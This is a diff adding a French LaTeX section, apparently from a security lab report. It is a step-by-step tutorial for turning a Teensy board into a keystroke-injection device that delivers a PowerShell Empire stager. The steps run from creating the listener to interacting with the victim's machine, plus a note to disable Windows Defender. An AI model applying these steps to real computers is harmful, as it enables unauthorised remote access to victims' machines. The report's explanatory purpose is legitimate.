@@ -1,0 +1,112 @@
+\section{Présentation des outils}
+
+\subsection{Premier outil: Teensy}
+
+\subsubsection{Présentation}
+
+Le Teensy est un kit de développement similaire aux produits de la gamme Arduino, 
+ce dispositif peut-être utilisé comme un HID (Human Interface Device), 
+c’est à dire se faire passer pour un clavier par exemple et envoyer des frappes de clavier à l’ordinateur 
+auquel il est connecté.
+
+Ce produit est aussi similaire au fameux “Rubber Ducky”, produit par la société Hak5, 
+il fournit les même possibilité mais il nécessite une configuration initial un peu plus poussé.
+
+\subsubsection{Installation}
+Pour commencer à développer sur le Teensy, il faut installer \href{https://www.arduino.cc/en/main/software}{l’IDE de Arduino}, 
+une fois l’installation effectuée il faut installer le \href{https://www.pjrc.com/teensy/teensyduino.html}{plugin Teensyduino}, qui va permettre de programmer sur le Teensy.
+
+Pour créer les différents payloads d’attaque,nous avons utilisé le framework “Empire”, qui permet de faciliter 
+la création de payloads malveillant pour les Teensy.
+
+Pour l’installer il suffit simplement de taper la commande suivante sur Kali Linux:
+
+\begin{lstlisting}{language=bash}
+\> apt install powershell-empire
+\end{lstlisting}
+
+Pour les autres distribution voir \href{https://github.com/BC-SECURITY/Empire/tree/dev}{ici}. 
+
+\subsubsection{Création de payloads}
+Nous allons donc utiliser “Empire” pour créer des palyoads pour le Teensy, pour ce faire, il faut démarrer “Empire” en tapant: 
+
+\begin{lstlisting}{language=bash}
+> powershell-empire
+\end{lstlisting}
+
+Ensuite il faut choisir quel listener utiliser, nous allons utiliser le listener “http”, il faut donc taper:
+
+\begin{lstlisting}{language=bash}
+> uselistener http
+\end{lstlisting}
+
+Ensuite, on peut configurer ce module comme un module Metasploit, ici on va juste changer le port d’écoute en tapant:
+
+\begin{lstlisting}{language=bash}
+> set Port 9000
+\end{lstlisting}
+
+Puis pour executer le listener on tape:
+
+\begin{lstlisting}{language=bash}
+> execute
+\end{lstlisting}
+
+Après il faut choisir le mode de transmission, ici on va choisir la transmission par un Teensy, il faut donc taper:
+
+\begin{lstlisting}{language=bash}
+> usestager windows/teensy
+\end{lstlisting}
+
+Puis associer le stagers au listener en tapant:
+
+\begin{lstlisting}{language=bash}
+> set Listener http
+\end{lstlisting}
+
+Et enfin, générer le payload en tapant:
+
+\begin{lstlisting}{language=bash}
+> generate
+\end{lstlisting}
+
+Empire devrait afficher que le fichier de script Arduino a bien été créer:
+
+Il ne nous reste plus qu’à le compiler et le transférez sur le Teensy, pour cela il faut 
+revenir sur l’IDE Arduino et ouvrir le fichier précédemment créé, puis cliquez sur le bouton en haut à gauche de compilation/vérification:
+
+Puis, une fois la compilation finie, il faut cliquer sur le bouton d’upload vers le Teensy:
+
+Il est possible que Arduino ne parviennent pas à mettre le Teensy en “Program Mode”, dans ce cas là, appuyez sur 
+le bouton présent sur le Teensy pour le mettre en “Program Mode” manuellement.
+
+Après tout cela, branchez le Teensy sur l’ordinateur cible, celui-ci devrait ouvrir un shell de cmd et tapez 
+son payload pour l'exécuter avec Powershell, une fois ceci fait, un agent devrait être disponible sur Empire:
+
+Pour voir les agents avec lesquels il est possible d'interagir, tapez:
+
+\begin{lstlisting}{language=bash}
+> agents
+\end{lstlisting}
+
+
+
+Pour interagir avec un agent, tapez:
+
+\begin{lstlisting}{language=bash}
+> interact $ID_AGENT
+\end{lstlisting}
+
+Il est maintenant possible d'interagir avec la machine de la victime !
+
+\textbf{Note:} Il faut désactiver la protection de Windows Defender pour que le payload s'exécute correctement.
+
+\subsubsection{Sources}
+\begin{enumerate}
+    \item \url{https://null-byte.wonderhowto.com/how-to/use-powershell-empire-generating-stagers-for-post-exploitation-windows-hosts-0179939/}
+    \item \url{http://www.powershellempire.com/?page_id=110}
+\end{enumerate}
+
+
+
+
